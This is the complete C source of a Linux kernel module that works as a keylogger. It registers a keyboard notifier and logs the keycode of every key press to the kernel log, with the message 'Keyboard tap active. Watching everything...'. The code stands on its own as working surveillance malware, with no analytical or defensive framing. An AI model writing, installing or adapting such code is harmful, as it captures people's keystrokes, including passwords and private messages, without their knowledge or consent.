#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>

/* Added 'static' to satisfy the compiler's strict prototype rules */
static int klog_cb(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYCODE && param->down) {
        printk(KERN_INFO "KEYLOG: Key %d pressed\n", param->value);
    }

    return NOTIFY_OK;
}

static struct notifier_block klog_nb = {
    .notifier_call = klog_cb
};

static int __init logger_init(void) {
    register_keyboard_notifier(&klog_nb);
    printk(KERN_INFO "LOGGER: Keyboard tap active. Watching everything...\n");
    return 0;
}

static void __exit logger_exit(void) {
    unregister_keyboard_notifier(&klog_nb);
    printk(KERN_INFO "LOGGER: Tap removed.\n");
}

module_init(logger_init);
module_exit(logger_exit);
MODULE_LICENSE("GPL");
